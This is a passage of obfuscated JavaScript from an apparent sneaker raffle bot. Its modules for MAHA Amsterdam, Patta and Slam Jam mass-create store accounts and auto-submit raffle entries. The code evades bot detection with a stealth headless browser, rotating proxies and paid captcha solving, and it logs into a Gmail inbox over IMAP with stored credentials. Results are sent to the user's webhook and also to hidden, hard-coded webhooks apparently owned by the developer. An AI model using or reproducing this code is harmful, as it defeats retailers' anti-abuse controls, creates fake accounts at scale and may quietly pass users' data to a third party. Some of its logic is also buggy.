                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x3657b3, _0x3d9ba0, _0xcbb680) {
                    var _0x3d9ba0 = [];
                    async function _0x5f5dfd() {
                        var _0x3a533f = new _0x27a360({
                            'user': _0x37a01c['masterMail'],
                            'password': _0x37a01c['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x57de83(_0x216b5d) {
                            _0x3a533f['openBox']('INBOX', ![], _0x216b5d);
                        }
                        _0x3a533f['once']('ready', function () {
                            _0x57de83(function (_0xaf34d7, _0x31db6f) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0xaf34d7)
                                    throw _0xaf34d7;
                                _0x3a533f['seq']['search'](['UNSEEN'], function (_0x40db46, _0x3b26b6) {
                                    if (!_0x3b26b6 || !_0x3b26b6['length'])
                                        console['log'](_0x223c9e() + '\x20[' + _0x3657b3['name'] + ']\x20No\x20mails\x20found'), _0x3a533f['end']();
                                    else {
                                        var _0x52d4f1 = _0x3a533f['seq']['fetch'](_0x3b26b6, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x52d4f1['on']('message', function (_0x3a8da0, _0x3a700c) {
                                            var _0x28fa93 = '(#' + _0x3a700c + ')\x20';
                                            _0x3a8da0['on']('body', function (_0x331b75, _0x1584ab) {
                                                _0x5d77b8(_0x331b75, (_0xe48629, _0x41e16b) => {
                                                    if (_0x41e16b['subject'] == 'Confirm\x20Your\x20Subscription' && _0x41e16b['from']['value'][0x0]['name'] == 'OQIUM') {
                                                        var _0x52131f = _0x41e16b['text']['split']('(')[0x1], _0x7d856c = _0x52131f['split'](')')[0x0];
                                                        _0x3d9ba0['push'](_0x7d856c);
                                                    }
                                                });
                                            }), _0x3a8da0['once']('end', function () {
                                            });
                                        }), _0x52d4f1['once']('error', function (_0x3f9562) {
                                            console['log']('Fetch\x20error:\x20' + _0x3f9562);
                                        }), _0x52d4f1['once']('end', function () {
                                            _0x3a533f['end']();
                                        });
                                    }
                                });
                            });
                        }), _0x3a533f['once']('error', function (_0xc9250b) {
                            console['log'](_0xc9250b);
                        }), _0x3a533f['once']('end', async function () {
                        }), _0x3a533f['connect']();
                    }
                    async function _0x295f2b(_0x103e97, _0x1ffa8e, _0x6c679c) {
                        for (var _0x3836b1 = 0x0; _0x3836b1 < _0x1ffa8e['length']; _0x3836b1++) {
                            async function _0x2f884f(_0x4c1819, _0x5b013d, _0x4c6b2f, _0x160699, _0x2fcbd5) {
                                var _0x126c8f, _0x4e9e16 = {}, _0x418e4f = [], _0x49051d = {}, _0x4be96f = [
                                    '40',
                                    '40,5',
                                    '41',
                                    '42',
                                    '42,5',
                                    '43',
                                    '44',
                                    '45',
                                    '45,5',
                                    '46',
                                    '47',
                                    '47,5',
                                    '48'
                                ], _0x27c23c = Math['round'](Math['random']() * (_0x4be96f['length'] - 0x1));
                                _0x160699[_0x4c1819]['Size'] == 'RANDOM' && (_0x160699[_0x4c1819]['Size'] = _0x4be96f[_0x27c23c]);
                                !_0x160699 && (_0x160699 = {});
                                if (_0x37a01c['useRandomProxy'] = ![])
                                    var _0x181f5b = _0x2fcbd5[_0x4c1819]['split'](':');
                                else
                                    var _0x2d5f53 = Math['round'](Math['random']() * (_0x2fcbd5['length'] - 0x1)), _0x181f5b = _0x2fcbd5[_0x2d5f53]['split'](':');
                                var _0x403894 = {
                                    'jar': _0x2b4f8d,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x4c6b2f['url'],
                                    'headers': _0x4c6b2f['headers'],
                                    'body': JSON['stringify'](_0x4e9e16),
                                    'proxy': 'http://' + _0x181f5b[0x2] + ':' + _0x181f5b[0x3] + '@' + _0x181f5b[0x0] + ':' + _0x181f5b[0x1]
                                };
                                return _0x5b013d != 'ver' && (_0x403894['url'] = _0x4c6b2f['url'], _0x403894['headers'] = _0x4c6b2f['headers']), _0x5b013d == 'ver' && (_0x403894['method'] = 'GET', _0x403894['url'] = _0x160699[_0x4c1819]), new Promise(function (_0x14f7f5, _0x391d89) {
                                    callback = async (_0x511a0f, _0x30aac9, _0x4c3c19) => {
                                        if (!_0x511a0f && _0x30aac9['statusCode'] == 0xca || !_0x511a0f && _0x30aac9['statusCode'] == 0xc8) {
                                            if (_0x5b013d != 'ver') {
                                                var _0x252c46 = await _0x550a27(_0x160699[_0x4c1819], _0x4c6b2f, 'dev', ![]), _0x317da9 = await _0x550a27(_0x160699[_0x4c1819], _0x4c6b2f, 'pub', ![]);
                                                const _0x4ba811 = {
                                                    'succesDEVMSG': { 'embeds': [_0x252c46] },
                                                    'succesPUBMSG': { 'embeds': [_0x317da9] }
                                                };
                                                if (_0x37a01c['webhook'] != undefined && _0x37a01c['webhook'] != '')
                                                    try {
                                                        await _0x21228b(_0x37a01c['webhook'], _0x4ba811['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0x1a79bd(0xc8), await _0x21228b(_0x152092, _0x4ba811['succesDEVMSG']), await _0x1a79bd(0xc8);
                                                try {
                                                    await _0x21228b(_0x136ee7, _0x4ba811['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0x4c6d06(_0x160699[_0x4c1819], _0x4c6b2f);
                                            }
                                            _0x14f7f5(console['log'](_0x41d282['green'](_0x223c9e() + '\x20[' + _0x4c6b2f['name'] + ']\x20Task\x20' + (_0x4c1819 + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x5b013d != 'ver') {
                                                var _0x4c31ad = '' + _0x511a0f, _0x564f2b = await _0x550a27(_0x160699[_0x4c1819], _0x4c6b2f, 'dev', !![], _0x4c31ad), _0x44383c = {};
                                                _0x44383c['errorDEV'] = { 'embeds': [_0x564f2b] }, _0x2e4d36(_0x160699[_0x4c1819], _0x4c6b2f), _0x37a01c['webhook'] != undefined && _0x37a01c['webhook'] != '' && await _0x21228b(_0x37a01c['webhook'], _0x44383c['errorDEV']), await _0x21228b(_0x549818, _0x44383c['errorDEV']);
                                            }
                                            _0x391d89(console['log'](_0x41d282['red'](_0x223c9e() + '\x20[' + _0x4c6b2f['name'] + ']\x20Task\x20' + (_0x4c1819 + 0x1) + ':\x20' + _0x511a0f)));
                                        }
                                    };
                                    try {
                                        _0x5b013d != 'ver' ? console['log'](_0x223c9e() + '\x20[' + _0x4c6b2f['name'] + ']\x20Task\x20' + (_0x4c1819 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x4e9e16['data']['attributes']['email']) : console['log'](_0x223c9e() + '\x20[' + _0x4c6b2f['name'] + ']\x20Task\x20' + (_0x4c1819 + 0x1) + ':\x20Fetching\x20Response'), _0x45dd39(_0x403894, callback);
                                    } catch (_0x30023d) {
                                        console['log'](_0x223c9e() + '\x20Task\x20' + (_0x4c1819 + 0x1) + ':\x20' + _0x30023d);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x2f884f(_0x3836b1, 'ver', _0x103e97, _0x1ffa8e, _0x6c679c), console['log'](_0x223c9e() + '\x20[' + _0x103e97['name'] + ']\x20Sleeping\x20for\x20' + _0x37a01c['delay'] + '\x20ms'), await _0x1a79bd(_0x37a01c['delay']);
                            } catch (_0x3c174b) {
                            }
                        }
                    }
                    try {
                        _0x5f5dfd(), await _0x1a79bd(0xfa0), console['log']('Found\x20' + _0x3d9ba0['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..');
                    }
                    await _0x295f2b(_0x3657b3, _0x3d9ba0, _0xcbb680);
                }
            }
        ]
    },
    {
        'name': 'PATTA',
        'modules': [
            {
                'name': 'PATTA\x20Account\x20Generator',
                'store': 'Patta',
                'logo': 'https://cdn.shopify.com/s/files/1/0473/6965/0340/collections/patta_42f8af38-44b4-4c1b-a6f3-ec368a7b6f58_1200x1200.jpg?v=1665406562',
                'function': async function (_0x5e5e93, _0x4bda20, _0x2c3a73) {
                    _0x198f78['use'](_0x538ad0()), _0x198f78['use'](_0x3393bf({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x37a01c['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x2a4ecb = 0x0; _0x2a4ecb < _0x4bda20['length']; _0x2a4ecb++) {
                        var _0x3b1b0a = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Patta\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x3da10f
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x37a01c['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x3dc3b3
                                }
                            ]
                        }];
                        const _0x1b1f41 = { 'embeds': _0x3b1b0a };
                        _0x219354(_0x5e5e93['name'] + '\x20Task\x20' + (_0x2a4ecb + 0x1) + '\x20/\x20' + _0x4bda20['length'] + '\x20||\x20File:\x20' + _0x4e44e9 + '\x20Proxies:\x20' + _0xd50a79), await _0x170817(_0x4bda20, _0x2a4ecb);
                        var _0x2a04a1 = await _0x550a27(_0x4bda20[_0x2a4ecb], _0x5e5e93, 'acc', ![]);
                        const _0x16cf3e = { 'succesDEVMSG': { 'embeds': [_0x2a04a1] } };
                        if (_0x4bda20[_0x2a4ecb]['Email'] == '' || _0x4bda20[_0x2a4ecb]['FirstName'] == '' || _0x4bda20[_0x2a4ecb]['LastName'] == '') {
                            console['log'](_0x223c9e() + '\x20[' + _0x1ee1d2[taskModule]['name'] + ']\x20Task\x20' + (_0x2a4ecb + 0x1) + '\x20:\x20Invalid\x20CSV'), await _0x1a79bd(0x7d0);
                            continue;
                        }
                        (_0x4bda20[_0x2a4ecb]['Password'] == '' || _0x4bda20[_0x2a4ecb] == undefined) && _0x4bda20[_0x2a4ecb]['Password'] == 'JRaffles23!';
                        if (_0x37a01c['useRandomProxy'] = ![])
                            var _0xe78773 = _0x2c3a73[_0x2a4ecb]['split'](':');
                        else
                            var _0x398eb6 = Math['round'](Math['random']() * (_0x2c3a73['length'] - 0x1)), _0xe78773 = _0x2c3a73[_0x398eb6]['split'](':');
                        const _0x320f6f = await _0x198f78['launch']({
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0xe78773[0x0] + ':' + _0xe78773[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                        try {
                            const _0x9ffa20 = await _0x320f6f['newPage']();
                            await _0x9ffa20['authenticate']({
                                'username': '' + _0xe78773[0x2],
                                'password': '' + _0xe78773[0x3]
                            }), console['log'](_0x223c9e() + '\x20[' + _0x5e5e93['name'] + ']\x20Task\x20' + (_0x2a4ecb + 0x1) + '\x20:\x20Getting\x20Session'), await _0x9ffa20['setRequestInterception'](!![]), _0x9ffa20['on']('request', _0x241200 => {
                                _0x241200['resourceType']() === 'image' || _0x241200['resourceType']() === 'font' || _0x241200['resourceType']() === 'media' ? _0x241200['abort']() : _0x241200['continue']();
                            }), await _0x9ffa20['goto']('https://patta.nl/account/register'), await _0x1a79bd(0xbb8), await _0x9ffa20['waitForSelector']('#RegisterForm-FirstName'), console['log'](_0x223c9e() + '\x20[' + _0x5e5e93['name'] + ']\x20Task\x20' + (_0x2a4ecb + 0x1) + '\x20:\x20Filling\x20information'), await _0x9ffa20['type']('#RegisterForm-FirstName', '' + _0x4bda20[_0x2a4ecb]['FirstName']), await _0x1a79bd(0x226), await _0x9ffa20['type']('#RegisterForm-LastName', '' + _0x4bda20[_0x2a4ecb]['LastName']), await _0x1a79bd(0x226), await _0x9ffa20['type']('#RegisterForm-email', '' + _0x4bda20[_0x2a4ecb]['Email']), await _0x1a79bd(0x226), await _0x9ffa20['type']('#RegisterForm-password', '' + _0x4bda20[_0x2a4ecb]['Password']), await _0x1a79bd(0x226), console['log'](_0x223c9e() + '\x20[' + _0x5e5e93['name'] + ']\x20Task\x20' + (_0x2a4ecb + 0x1) + '\x20:\x20Submitting..'), await _0x9ffa20['$eval']('#RegisterForm', _0x528980 => _0x528980['submit']()), await _0x1a79bd(0x1f40);
                            try {
                                await _0x9ffa20['waitForSelector']('.home-page-grid__collection'), await _0x1a79bd(0x1f4), console['log'](_0x41d282['green'](_0x223c9e() + '\x20[' + _0x5e5e93['name'] + ']\x20Task\x20' + (_0x2a4ecb + 0x1) + '\x20:\x20Account\x20' + _0x4bda20[_0x2a4ecb]['Email'] + '\x20Generated!')), _0x496729['appendFileSync']('../accounts/patta.csv', '\x0a' + _0x4bda20[_0x2a4ecb]['Email'] + ',' + _0x4bda20[_0x2a4ecb]['Password']), console['log'](_0x41d282['yellow'](_0x223c9e() + '\x20[' + _0x5e5e93['name'] + ']\x20Task\x20' + (_0x2a4ecb + 0x1) + '\x20:\x20Account\x20' + _0x4bda20[_0x2a4ecb]['Email'] + '\x20Saved\x20in\x20\x27accounts/patta.csv\x27'));
                                try {
                                    _0x37a01c['webhook'] != undefined && _0x37a01c['webhook'] != '' && await _0x21228b(_0x37a01c['webhook'], _0x16cf3e['succesDEVMSG']);
                                } catch {
                                }
                                await _0x21228b(_0x1cab4c, _0x16cf3e['succesDEVMSG']);
                            } catch (_0xb4bab3) {
                                console['log'](_0x41d282['red'](_0x223c9e() + '\x20[' + _0x1ee1d2[taskModule]['name'] + ']\x20Task\x20' + (_0x2a4ecb + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0xb4bab3));
                            }
                        } catch (_0x451775) {
                            console['log'](_0x41d282['red'](_0x223c9e() + '\x20[' + _0x1ee1d2[taskModule]['name'] + ']\x20Task\x20' + (_0x2a4ecb + 0x1) + '\x20:\x20' + _0x451775));
                        } finally {
                            _0x320f6f && _0x320f6f['close'](), console['log']('Waiting\x20for\x20' + _0x37a01c['delay'] + '\x20ms'), await _0x1a79bd(_0x37a01c['delay']);
                        }
                    }
                }
            },
            {
                'name': 'PATTA\x20Raffle\x20Entries',
                'store': 'Patta',
                'logo': 'https://cdn.shopify.com/s/files/1/0473/6965/0340/collections/patta_42f8af38-44b4-4c1b-a6f3-ec368a7b6f58_1200x1200.jpg?v=1665406562',
                'function': async function (_0x5279c5, _0x34c459, _0x3feb95) {
                    _0x198f78['use'](_0x538ad0()), _0x198f78['use'](_0x3393bf({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x37a01c['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x1429e4 = 0x0; _0x1429e4 < _0x34c459['length']; _0x1429e4++) {
                        var _0x13056b;
                        if (_0x25a427 != 'yes')
                            var _0x25a427 = '', _0x8b2c59 = 0x0;
                        _0x219354(_0x5279c5['name'] + '\x20Task\x20' + (_0x1429e4 + 0x1) + '\x20/\x20' + _0x34c459['length'] + '\x20||\x20File:\x20' + _0x4e44e9 + '\x20Proxies:\x20' + _0xd50a79), await _0x170817(_0x34c459, _0x1429e4);
                        if (_0x34c459[_0x1429e4]['Email'] == '' || _0x34c459[_0x1429e4]['Password'] == '' || _0x34c459[_0x1429e4]['FirstName'] == '' || _0x34c459[_0x1429e4]['LastName'] == '') {
                            console['log'](_0x223c9e() + '\x20[' + _0x1ee1d2[taskModule]['name'] + ']\x20Task\x20' + (_0x1429e4 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        if (_0x37a01c['useRandomProxy'] = ![])
                            var _0x3fd03b = _0x3feb95[_0x1429e4]['split'](':');
                        else
                            var _0x599eff = Math['round'](Math['random']() * (_0x3feb95['length'] - 0x1)), _0x3fd03b = _0x3feb95[_0x599eff]['split'](':');
                        const _0x1ab8e0 = await _0x198f78['launch']({
                            'headless': ![],
                            'args': [
                                '--proxy-server=' + _0x3fd03b[0x0] + ':' + _0x3fd03b[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                        try {
                            const _0x5494a2 = await _0x1ab8e0['newPage']();
                            await _0x5494a2['authenticate']({
                                'username': '' + _0x3fd03b[0x2],
                                'password': '' + _0x3fd03b[0x3]
                            }), console['log'](_0x223c9e() + '\x20[' + _0x5279c5['name'] + ']\x20Task\x20' + (_0x1429e4 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x5494a2['setRequestInterception'](!![]), _0x5494a2['on']('request', _0x5beab0 => {
                                _0x5beab0['resourceType']() === 'image' || _0x5beab0['resourceType']() === 'font' || _0x5beab0['resourceType']() === 'media' ? _0x5beab0['abort']() : _0x5beab0['continue']();
                            }), await _0x5494a2['goto']('https://www.patta.nl/nl/account/login', {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x5494a2['waitForSelector']('#CustomerEmail'), console['log'](_0x223c9e() + '\x20[' + _0x5279c5['name'] + ']\x20Task\x20' + (_0x1429e4 + 0x1) + '\x20:\x20Logging\x20in..'), await _0x5494a2['type']('#CustomerEmail', '' + _0x34c459[_0x1429e4]['Email']), await _0x1a79bd(0x12c), await _0x5494a2['type']('#CustomerPassword', '' + _0x34c459[_0x1429e4]['Password']), await _0x1a79bd(0x226), await _0x5494a2['$eval']('#customer_login', _0xc65269 => _0xc65269['submit']());
                            try {
                                await _0x5494a2['waitForSelector']('#orders'), await _0x1a79bd(0x4b0);
                            } catch {
                                console['log'](_0x41d282['red'](_0x223c9e() + '\x20[' + _0x5279c5['name'] + ']\x20Task\x20' + (_0x1429e4 + 0x1) + '\x20:\x20Task\x20failed,\x20invalid\x20credentials'));
                                continue;
                            }
                            await _0x5494a2['goto']('' + _0x34c459[_0x1429e4]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x1a79bd(0xbb8), console['log'](_0x223c9e() + '\x20[' + _0x5279c5['name'] + ']\x20Task\x20' + (_0x1429e4 + 0x1) + '\x20:\x20Starting\x20Entry');
                            try {
                                await _0x5494a2['waitForSelector']('#email');
                            } catch {
                                console['log'](_0x41d282['red'](_0x223c9e() + '\x20[' + _0x5279c5['name'] + ']\x20Task\x20' + (_0x1429e4 + 0x1) + '\x20:\x20Duplicate\x20entry/\x20Account\x20error'));
                            }
                            await _0x5494a2['type']('#email', '' + _0x34c459[_0x1429e4]['Email']), await _0x1a79bd(0x384), await _0x5494a2['type']('#first_name', '' + _0x34c459[_0x1429e4]['FirstName']), await _0x1a79bd(0x514), await _0x5494a2['type']('#last_name', '' + _0x34c459[_0x1429e4]['LastName']), await _0x1a79bd(0x514), await _0x5494a2['type']('#street_address', _0x34c459[_0x1429e4]['Address1'] + '\x20' + _0x34c459[_0x1429e4]['HouseNumber'] + '\x20' + _0x34c459[_0x1429e4]['Address2']), await _0x1a79bd(0x2bc);
                            _0x34c459[_0x1429e4]['Postcode'] == undefined && (_0x34c459[_0x1429e4]['Postcode'] = _0x34c459[_0x1429e4]['Zip']);
                            await _0x5494a2['type']('#zip_code', '' + _0x34c459[_0x1429e4]['Postcode']), await _0x1a79bd(0x320), await _0x5494a2['type']('#city', '' + _0x34c459[_0x1429e4]['City']), await _0x1a79bd(0x320), await _0x5494a2['type']('#bday', '01/01/1994'), await _0x1a79bd(0x320), await _0x5494a2['type']('#instagram', '' + _0x34c459[_0x1429e4]['Follower']), await _0x1a79bd(0x352);
                            if (_0x34c459[_0x1429e4]['Size'] == 'RANDOM') {
                                const _0xacc7b5 = await _0x5494a2['$$eval']('div[id=\x22raffle__size-selector-container\x22]\x20>\x20label', _0x53b70e => {
                                    return _0x53b70e['map'](_0x577305 => _0x577305['textContent']);
                                });
                                var _0x1a938e = Math['round'](Math['random']() * (_0xacc7b5['length'] - 0x1));
                                console['log'](_0x223c9e() + '\x20[' + _0x5279c5['name'] + ']\x20Task\x20' + (_0x1429e4 + 0x1) + '\x20:\x20Picking\x20Random\x20Size\x20' + _0xacc7b5[_0x1a938e]), await _0x5494a2['click']('label[data-eu-size=\x22' + _0xacc7b5[_0x1a938e] + '\x22]');
                            } else {
                                console['log'](_0x223c9e() + '\x20[' + _0x5279c5['name'] + ']\x20Task\x20' + (_0x1429e4 + 0x1) + '\x20:\x20Picking\x20Size\x20' + _0x34c459[_0x1429e4]['Size']);
                                try {
                                    await _0x5494a2['click']('label[data-eu-size=\x22' + _0x34c459[_0x1429e4]['Size'] + '\x22]');
                                } catch {
                                    await _0x5494a2['click']('label[data-eu-size=\x22' + _0x34c459[_0x1429e4]['Size'] + '.0\x22]');
                                }
                            }
                            await _0x1a79bd(0xbb8), await _0x5494a2['$$eval']('.raffle__checkbox-label', _0x457b84 => _0x457b84['forEach'](_0x227d3a => _0x227d3a['click']())), await _0x1a79bd(0x7d0), console['log'](_0x223c9e() + '\x20[' + _0x5279c5['name'] + ']\x20Task\x20' + (_0x1429e4 + 0x1) + '\x20:\x20Submitting\x20Entry'), await _0x5494a2['click']('#raffle__form-submit'), await _0x1a79bd(0x1388);
                            try {
                                await _0x5494a2['waitForSelector']('#raffle__confirmation-message-container'), _0x25a427 = 'no', _0x4c6d06(_0x34c459[_0x1429e4], _0x5279c5), console['log'](_0x41d282['green'](_0x223c9e() + '\x20[' + _0x5279c5['name'] + ']\x20Task\x20' + (_0x1429e4 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            } catch (_0x170150) {
                                console['log'](_0x41d282['red'](_0x223c9e() + '\x20[' + _0x1ee1d2[taskModule]['name'] + ']\x20Task\x20' + (_0x1429e4 + 0x1) + '\x20:\x20Raffle\x20entry\x20failed.\x20' + _0x170150));
                            }
                        } catch (_0x40e864) {
                            console['log'](_0x41d282['red'](_0x223c9e() + '\x20[' + _0x1ee1d2[taskModule]['name'] + ']\x20Task\x20' + (_0x1429e4 + 0x1) + '\x20:\x20' + _0x40e864)), _0x25a427 = 'yes';
                        } finally {
                            _0x1ab8e0 && _0x1ab8e0['close']();
                            if (_0x25a427 == 'yes' && _0x8b2c59 != 0x5 && _0x13056b != 'Size\x20Not\x20Found') {
                                console['log'](_0x41d282['red'](_0x223c9e() + '\x20[' + _0x5279c5['name'] + ']\x20Task\x20' + (_0x1429e4 + 0x1) + '\x20:\x20Retrying')), _0x1429e4 = _0x1429e4 - 0x1, _0x8b2c59 = _0x8b2c59 + 0x1;
                                continue;
                            }
                            _0x25a427 == 'yes' && _0x8b2c59 >= 0x5 && (_0x2e4d36(_0x34c459[_0x1429e4], _0x5279c5), _0x25a427 = 'no', _0x8b2c59 = 0x0), console['log']('Waiting\x20for\x20' + _0x37a01c['delay'] + '\x20ms'), await _0x1a79bd(_0x37a01c['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'SLAM\x20JAM',
        'modules': [
            {
                'name': 'SLAM\x20JAM\x20Account\x20Generator',
                'store': 'SLAM\x20JAM',
                'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,f_auto,q_auto:eco,dpr_1/2c778bc022405e206505',
                'function': async function (_0x3017e2, _0x53d193, _0x26e3c4) {
                    _0x198f78['use'](_0x538ad0()), _0x198f78['use'](_0x3393bf({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x37a01c['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x55654c = 0x0; _0x55654c < _0x53d193['length']; _0x55654c++) {
                        if (_0x2b5a7e != 'yes')
                            var _0x2b5a7e = '', _0x3bf428 = 0x0;
                        var _0x53ce02 = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Patta\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x3da10f
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x37a01c['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x3dc3b3
                                }
                            ]
                        }];
                        const _0x197fb7 = { 'embeds': _0x53ce02 };
                        _0x219354(_0x3017e2['name'] + '\x20Task\x20' + (_0x55654c + 0x1) + '\x20/\x20' + _0x53d193['length'] + '\x20||\x20File:\x20' + _0x4e44e9 + '\x20Proxies:\x20' + _0xd50a79), await _0x170817(_0x53d193, _0x55654c);
                        var _0x1c53c5 = await _0x550a27(_0x53d193[_0x55654c], _0x3017e2, 'acc', ![]);
                        const _0x26a3a5 = { 'succesDEVMSG': { 'embeds': [_0x1c53c5] } };
                        if (_0x53d193[_0x55654c]['Email'] == '' || _0x53d193[_0x55654c]['FirstName'] == '' || _0x53d193[_0x55654c]['LastName'] == '') {
                            console['log'](_0x223c9e() + '\x20[' + _0x1ee1d2[taskModule]['name'] + ']\x20Task\x20' + (_0x55654c + 0x1) + '\x20:\x20Invalid\x20CSV'), await _0x1a79bd(0x7d0);
                            continue;
                        }
                        (_0x53d193[_0x55654c]['Password'] == '' || _0x53d193[_0x55654c] == undefined) && _0x53d193[_0x55654c]['Password'] == 'JRaffles23!';
                        if (_0x37a01c['useRandomProxy'] = ![])
                            var _0x33632c = _0x26e3c4[_0x55654c]['split'](':');
                        else
                            var _0x4cc511 = Math['round'](Math['random']() * (_0x26e3c4['length'] - 0x1)), _0x33632c = _0x26e3c4[_0x4cc511]['split'](':');
                        const _0x7a23a8 = await _0x198f78['launch']({
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x33632c[0x0] + ':' + _0x33632c[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                        try {
                            const _0xb23cc7 = await _0x7a23a8['newPage']();
                            await _0xb23cc7['authenticate']({
                                'username': '' + _0x33632c[0x2],
                                'password': '' + _0x33632c[0x3]
                            }), console['log'](_0x223c9e() + '\x20[' + _0x3017e2['name'] + ']\x20Task\x20' + (_0x55654c + 0x1) + '\x20:\x20Getting\x20Session'), await _0xb23cc7['setRequestInterception'](!![]), _0xb23cc7['on']('request', _0x448af2 => {
                                _0x448af2['resourceType']() === 'image' || _0x448af2['resourceType']() === 'font' || _0x448af2['resourceType']() === 'media' ? _0x448af2['abort']() : _0x448af2['continue']();
                            }), await _0xb23cc7['goto']('https://drop.slamjam.com/account/register'), await _0x1a79bd(0xbb8), await _0xb23cc7['waitForSelector']('#FirstName'), await _0xb23cc7['waitForSelector']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0xb23cc7['click']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), console['log'](_0x223c9e() + '\x20[' + _0x3017e2['name'] + ']\x20Task\x20' + (_0x55654c + 0x1) + '\x20:\x20Filling\x20information'), await _0x1a79bd(0x4b0), await _0xb23cc7['type']('#FirstName', '' + _0x53d193[_0x55654c]['FirstName']), await _0x1a79bd(0x226), await _0xb23cc7['type']('#LastName', '' + _0x53d193[_0x55654c]['LastName']), await _0x1a79bd(0x226), await _0xb23cc7['type']('#Email', '' + _0x53d193[_0x55654c]['Email']), await _0x1a79bd(0x2ee), await _0xb23cc7['type']('#ConfirmEmail', '' + _0x53d193[_0x55654c]['Email']), await _0x1a79bd(0x2ee), await _0xb23cc7['type']('#CreatePassword', '' + _0x53d193[_0x55654c]['Password']), await _0x1a79bd(0x2ee), await _0xb23cc7['type']('#CreateConfirmPassword', '' + _0x53d193[_0x55654c]['Password']), await _0x1a79bd(0x226), console['log'](_0x223c9e() + '\x20[' + _0x3017e2['name'] + ']\x20Task\x20' + (_0x55654c + 0x1) + '\x20:\x20Submitting..'), await _0xb23cc7['$eval']('#create_customer', _0x3229b1 => _0x3229b1['submit']()), await _0x1a79bd(0x1388), console['log'](_0x223c9e() + '\x20[' + _0x3017e2['name'] + ']\x20Task\x20' + (_0x55654c + 0x1) + '\x20:\x20' + _0x41d282['cyan']('Solving\x20Captcha')), await _0xb23cc7['solveRecaptchas'](), console['log'](_0x223c9e() + '\x20[' + _0x3017e2['name'] + ']\x20Task\x20' + (_0x55654c + 0x1) + '\x20:\x20Captcha\x20solved'), await _0xb23cc7['$eval']('.shopify-challenge__container\x20>\x20form', _0x7e7026 => _0x7e7026['submit']());
                            try {
                                await _0xb23cc7['waitForSelector']('.product-card__image'), await _0x1a79bd(0x1f4), _0x2b5a7e = 'no', console['log'](_0x41d282['green'](_0x223c9e() + '\x20[' + _0x3017e2['name'] + ']\x20Task\x20' + (_0x55654c + 0x1) + '\x20:\x20Account\x20' + _0x53d193[_0x55654c]['Email'] + '\x20Generated!')), _0x496729['appendFileSync']('../accounts/slamjam.csv', '\x0a' + _0x53d193[_0x55654c]['Email'] + ',' + _0x53d193[_0x55654c]['Password']), console['log'](_0x41d282['yellow'](_0x223c9e() + '\x20[' + _0x3017e2['name'] + ']\x20Task\x20' + (_0x55654c + 0x1) + '\x20:\x20Account\x20' + _0x53d193[_0x55654c]['Email'] + '\x20Saved\x20in\x20\x27accounts/slamjam.csv\x27'));
                                try {
                                    _0x37a01c['webhook'] != undefined && _0x37a01c['webhook'] != '' && await _0x21228b(_0x37a01c['webhook'], _0x26a3a5['succesDEVMSG']);
                                } catch {
                                }
                                await _0x21228b(_0x1cab4c, _0x26a3a5['succesDEVMSG']);
                            } catch (_0x228be9) {
